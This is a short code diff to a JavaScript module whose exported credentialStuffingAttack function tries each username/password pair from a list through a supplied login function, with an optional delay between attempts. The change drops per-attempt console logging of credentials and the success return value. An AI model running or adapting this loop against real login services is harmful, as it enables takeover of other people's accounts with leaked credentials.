@@ -21,10 +21,9 @@ async function tryLogin(username, password, attemptLogin) {
  * @param {function} attemptLogin Attempts login.
  * @param {function} onCredentialAttempted Callback after each attempt.
  * @param {number} [delay=0] Delay in milliseconds between login attempts.
- * @returns {Promise<boolean>} Overall success.
+ * @returns {Promise<void>}
  */
 async function credentialStuffingAttack(credentials, attemptLogin, onCredentialAttempted, delay = 0) {
-  let success = false;
   for (const credential of credentials) {
     const { username, password } = credential;
 
@@ -35,13 +34,6 @@ async function credentialStuffingAttack(credentials, attemptLogin, onCredentialA
     try {
       const result = await tryLogin(username, password, attemptLogin);
 
-      if (result) {
-        success = true;
-        console.log(`Success: ${username}, ${password}`);
-      } else {
-        console.log(`Failed: ${username}, ${password}`);
-      }
-
       if (onCredentialAttempted) {
         onCredentialAttempted(username, password, result);
       }
@@ -49,8 +41,6 @@ async function credentialStuffingAttack(credentials, attemptLogin, onCredentialA
       console.error("Error during login attempt:", error);
     }
   }
-
-  return success;
 }
 
 export { tryLogin, credentialStuffingAttack };
